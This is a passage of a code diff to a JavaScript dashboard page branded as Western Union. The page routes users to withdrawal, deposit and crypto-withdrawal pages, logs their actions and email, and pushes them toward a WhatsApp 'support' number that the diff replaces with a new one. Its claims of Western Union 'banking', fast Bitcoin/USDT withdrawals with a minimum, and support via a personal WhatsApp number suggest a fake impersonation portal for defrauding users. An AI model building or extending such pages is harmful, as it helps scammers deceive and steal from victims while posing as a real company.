+                    setTimeout(() => { window.location.href = 'withdraw.html'; }, 400);
+                    break;
+                case 'deposit':
+                    window.location.href = 'deposit.html';
+                    break;
+                case 'crypto':
+                    alert("₿ Crypto Withdrawal\n\nBitcoin / USDT withdrawals are processed within 20-40 min.\nMinimum: $75 equivalent.");
+                    setTimeout(() => { window.location.href = 'access.html'; }, 400);
+                    break;
+                case 'history':
+                    alert("📜 Transaction Ledger\n\nLoading complete transaction history...");
+                    setTimeout(() => { window.location.href = 'history.html'; }, 400);
+                    break;
+                case 'notifications':
+                    showNotificationsAlert();
+                    break;
+                case 'whatsapp_chat':
+                    openWhatsappChat();
+                    break;
+                case 'logout':
+                    sendSecureLog('user_logout_executed', { userEmail: currentUser?.email });
+                    try {
+                        await fetch('/logout', { method: 'POST' });
+                    } catch (e) {}
+                    localStorage.removeItem('wu_current_user_email');
+                    localStorage.removeItem('wu_current_user');
+                    alert("✓ Logged out securely. Thank you for banking with Western Union.");
+                    window.location.href = 'index.html';
+                    break;
+                default:
+                    console.warn("Unknown action");
+            }
+        }
+
+        function bindActionCards() {
+            const tiles = document.querySelectorAll('.action-tile');
+            tiles.forEach(tile => {
+                const actionVal = tile.getAttribute('data-action');
+                if (actionVal) {
+                    tile.addEventListener('click', (e) => {
+                        e.stopPropagation();
+                        onActionTriggered(actionVal);
+                    });
+                }
+            });
+        }
+
+        function setupFooterInteractions() {
+            const footerLinks = document.querySelectorAll('[data-footer-link]');
+            footerLinks.forEach(link => {
+                link.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    const linkType = link.getAttribute('data-footer-link');
+                    sendSecureLog('footer_policy_click', { section: linkType });
+                    alert(`📄 Western Union - ${link.innerText}\n\nYour financial security is our priority. All data protected with bank-grade encryption.`);
+                });
+            });
+        }
+
+        function setupNotificationBellUI() {
+            const bellBtn = document.getElementById('notificationBell');
+            bellBtn.addEventListener('click', () => {
+                bellBtn.classList.add('bell-ring');
+                setTimeout(() => bellBtn.classList.remove('bell-ring'), 400);
+                onActionTriggered('notifications');
+            });
+        }
+
+        function setupPeriodicNotifications() {
+            setInterval(async () => {
+                try {
+                    const response = await fetch('/history');
+                    if (response.ok) {
+                        const history = await response.json();
+                        const newNotifs = history.filter(item =>
+                            item.type === 'notification' &&
+                            !notificationsArray.some(n => n.id === item.notificationId)
+                        ).slice(0, 3);
+
+                        if (newNotifs.length > 0) {
+                            newNotifs.forEach(notif => {
+                                notificationsArray.unshift({
+                                    id: notif.notificationId,
+                                    title: notif.title || 'New Alert',
+                                    message: notif.message,
+                                    read: false,
+                                    time: new Date(notif.date)
+                                });
+                            });
+                            updateNotifBadge();
+                            const bellDiv = document.getElementById('notificationBell');
+                            bellDiv.classList.add('bell-ring');
+                            setTimeout(() => bellDiv.classList.remove('bell-ring'), 500);
+                            sendSecureLog('new_notification_received', { count: newNotifs.length });
+                        }
+                    }
+                } catch (e) {}
+            }, 45000);
+        }
+
+        // ============================================
+        // INITIALIZATION
+        // ============================================
+        window.addEventListener('DOMContentLoaded', async () => {
+            await fetchUserData();
+            await loadNotifications();
+            bindActionCards();
+            setupFooterInteractions();
+            setupNotificationBellUI();
+            setupPeriodicNotifications();
+
+            const toggleBtn = document.getElementById('balanceToggleBtn');
+            if (toggleBtn) toggleBtn.addEventListener('click', toggleBalanceVisibility);
+
+            // WhatsApp button bindings
+            const copyWhatsappBtn = document.getElementById('copyWhatsappNumberBtn');
+            if (copyWhatsappBtn) copyWhatsappBtn.addEventListener('click', copyWhatsappNumber);
+
+            const openWhatsappBtn = document.getElementById('openWhatsappChatBtn');
+            if (openWhatsappBtn) openWhatsappBtn.addEventListener('click', openWhatsappChat);
+
+            // Floating WhatsApp button
+            const floatingBtn = document.getElementById('floatingWhatsappButton');
+            if (floatingBtn) floatingBtn.addEventListener('click', openWhatsappChat);
+
+            sendSecureLog('dashboard_fully_loaded', {
+                timestamp: new Date().toISOString(),
+                theme: 'modern_whatsapp_support',
+                whatsappEnabled: true,
+                supportNumber: WHATSAPP_NUMBER
+            });
+
+            console.log(`✅ Western Union Dashboard Active — WhatsApp Support Ready`);
+            console.log(`💬 WhatsApp Support: +1 (227) 285-9869`);
         });
-        
-        console.log(`✅ Western Union Dashboard Active — WhatsApp Support Ready`);
-        console.log(`💬 WhatsApp Support: +1 (825) 592-0370`);
-    });
-</script>
+    </script>
 </body>
 </html>
